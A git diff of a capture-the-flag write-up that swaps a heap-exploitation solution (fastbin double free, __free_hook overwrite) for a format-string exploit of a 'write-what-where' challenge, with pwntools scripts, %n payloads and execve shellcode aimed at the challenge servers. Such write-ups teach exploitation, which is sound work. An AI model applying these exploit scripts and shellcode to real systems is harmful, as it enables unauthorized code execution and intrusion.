@@ -6,6 +6,7 @@ but I enjoyed solving it this way, please refer to [the author's original write-
 # Description
 The path is clear, but do you know how to get there<br>
 Category: PWN
+(The code was also provided)
 
 # Why did my mind think this way?
 
@@ -17,138 +18,81 @@ is the one used to calculate the offset of the buffer in the stack, (I knew this
 ![](./chall.png)
 
 # Vulnerabilities
-* The binary is using the read function which doesn't append a null-byte at the end of the input string which helps us leak memory addresses.<br>
-* the safefree function attempts to free the pointer reference instead of the pointer itself giving us control over an arbitrary free,
-which leads us to arbitrary write).<br>
+If we check the code, we notice that there is a format-string vulnerbility in the print_name function
+```c
+void print_name(char name[NAME_SIZE]){
+    printf(name); // format string :)
+}
+```
 
 # TL;DR
 
-1 _ consolidate 2 fastchunks and leak heap address.<br>
-2 _ consolidate 2 large chunks and leak main_arena address to calculate libc base address.<br>
-3 _ double free a fastchunk to poinson the fastbin pointer to point to __free_hook.<br>
-4 _ overwrite __free_hook with system address.<br>
-5 _ free(bin_sh_pointer) //system("/bin/sh");<br>
+Technically we can exploit this vuln to overwrite some function code in the code segment with our own shellcode,<br>
+but what i did was:
+1 Overwrite the RBP pointer using the format-string, to make it point to the menu function in the code segment<br>
+2 Use the get_name function to overwrite the menu function code in the code segment with our shellcode.<br>
+3 When the menu function gets executed in the next loop iteration, a shell will be poped instead :)<br>
 
-# Solution
+# Exploit
 
 ```python
 #!/usr/bin/env python3
-
 from pwn import *
 
-exe = ELF("./safefree_patched")
-libc = ELF("./libc-2.27.so")
-ld = ELF("./ld-2.27.so")
-
+exe = ELF("./chall")
 context.binary = exe
-context.terminal = ['st']
+
+shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
 
 def conn():
-    if args.LOCAL:
-        r = process(exe.path)
-    else:
-        r = remote("pwn.ctf.shellmates.club", 1502)
+    return remote("write-what-where.ctf.shellmates.club", 443, ssl=True)
 
-    return r
-
-def allocate(io, size, data):
-    io.sendlineafter(b"Choice", b"1")
-    io.sendlineafter(b"Size", str(size))
-    io.sendlineafter(b"Data", data)
-
-def free(io, index):
-    io.sendlineafter(b"Choice", b"2")
-    io.sendlineafter(b"Index", str(index))
-
-def safefree(io, index):
-    io.sendlineafter(b"Choice", b"3")
-    io.sendlineafter(b"Index", str(index))
-
-def view(io, index):
-    io.sendlineafter(b"Choice", b"4")
-    io.sendlineafter(b"Index", str(index))
-
-def leak(io):
-    io.recvuntil(b"Data")
-    io.recvline()
-    return(u64(io.recvline(keepends=False).ljust(8, b'\0')))
 
 def main():
-    r = conn()
+    for i in range(10):
+        r = conn()
 
-    log.info("Leaking heap address")
-    
-    #filling the tcachebin for size 0x10 and adding 2 fastchunks of the same size
-    for i in range(9):
-        allocate(r, 0x10, '')
-    for i in range(9):
-        free(r, i)
-    
-    #forcing fastbin consolidation by allocating a large chunk (in the consolidated space from the 2 fastchunks + top chunk)
-    allocate(r, 0x410, 'a'*0x1f)
+        # Leaking stack & code addresses
+        r.recvuntil(b'Choice')
+        r.sendline(b'1')
+        r.sendline(b'%7$p\n%9$p')
+        r.recvuntil(b'Choice:')
+        r.sendline(b'2')
+        rbp_addr = int(r.recvline().strip(), 16)  - 0x30
+        menu_addr = int(r.recvline().strip(), 16) - 3
+        log.info(f"Leaking base pointer address :: {hex(rbp_addr)}")
+        log.info(f"Leaking menu function address :: {hex(menu_addr)}")
 
-    #leaking fastbin pointer (from previous second fastbins)
-    view(r, 0)
-    fastbin = leak(r)
-    log.info(f"fastbin at: {hex(fastbin)}")
+        r.recvuntil(b'Choice')
+        r.sendline(b'1')
 
-    log.info("Leaking libc address")
+        # forming the format-string payload
+        left = (menu_addr >> 32) - 12 #12 'a' at the start of the payload
+        right = (menu_addr & 0xffffffff) - left #offset of aaaaaa and already written bytes
 
-    #allocating 2 more large chunks (the third chunk is to prevent consolidation with top chunk, it's size does't matter)
-    allocate(r, 0x410, '')
-    allocate(r, 0x410, '')
+        s = f'aaaaaaaaaaaa%{str(left)}c%19$n%{str(right)}c%20$n'
+        if len(s) != 40:
+            log.info(f"bad payload length :: {len(s)}")
+            print(s)
+            r.close()
+            continue
 
-    #consolidation of the first and second large chunks
-    free(r, 1)
-    free(r, 0)
+        # overwriting the RBP pointer with a menu function pointer (minus some offset)
+        r.sendline(flat(b'aaaaaaaaaaaa%', str(left), b'c%19$n%', str(right), b'c%20$n', p64(rbp_addr+4), p64(rbp_addr)))
+        r.recvuntil(b'Choice:')
+        r.sendline(b'2')
 
-    #allocating a large chunk of a bigger size (in the consolidated space from the first and second large chunks)
-    allocate(r, 0x430, 'a'*0x41f)
-    view(r, 0)
+        # Overwriting menu function code with shellcode using get_name option
+        r.recvuntil(b'Choice:')
+        r.sendline(b'1')
+        r.sendline(flat(shellcode))
+        r.interactive()
 
-    #leaking main_arena pointer (from previous second large chunk)
-    libc.address = leak(r) - (libc.symbols['main_arena']+0x60)
-    log.info(f"libc base address at: {hex(libc.address)}")
-
-    #freeing all indexes just for simplifiying the exploit
-    free(r, 2)
-    free(r, 0)
-    
-    #filling the tcachebin for size 0x10 plus 2 fastchunks of the same size
-    for i in range(9):
-        allocate(r, 0x10, '')
-    for i in range(9):
-        free(r, i)
-
-    #allocating a chunk of a different size (to not mess with tcache)
-    allocate(r, 0x20, p64(fastbin+0x10))
-
-    #double freeing the first fastchunk
-    safefree(r, 0)
-
-    #allocating 7 chunks to empty tcachebin (and using of them as a pointer argument to '/bin/sh' for system later)
-    for i in range(7):
-        allocate(r, 0x10, '/bin/sh')
-
-    #poisoning the forward pointer of the double-freed fastchunk to point to __free_hook
-    allocate(r, 0x10, p64(libc.symbols['__free_hook']))
-    
-    #allocating the 2 fastchunks (now __free_hook is at the head of the fastbin of size 0x10)
-    for i in range(2):
-        allocate(r, 0x10, '')
-    
-    #allocating a chunk overlaping with __free_hook and overwriting it with system address
-    allocate(r, 0x10, p64(libc.symbols['system']))
-
-    #system("/bin/sh");
-    free(r, 1)
-
-    r.interactive()
 
 if __name__ == "__main__":
     main()
-    #
 ```
-# Flag
-`shellmates{M4AAYb3_juSt_STIck_t0_tHE_OLD_WaYS}`
+# Flag from tty
 
+I ran my exploit on my second thinkpad (that had only arch installed with no display manager, because my main laptop was acting up)
+![](../flag.jpg)
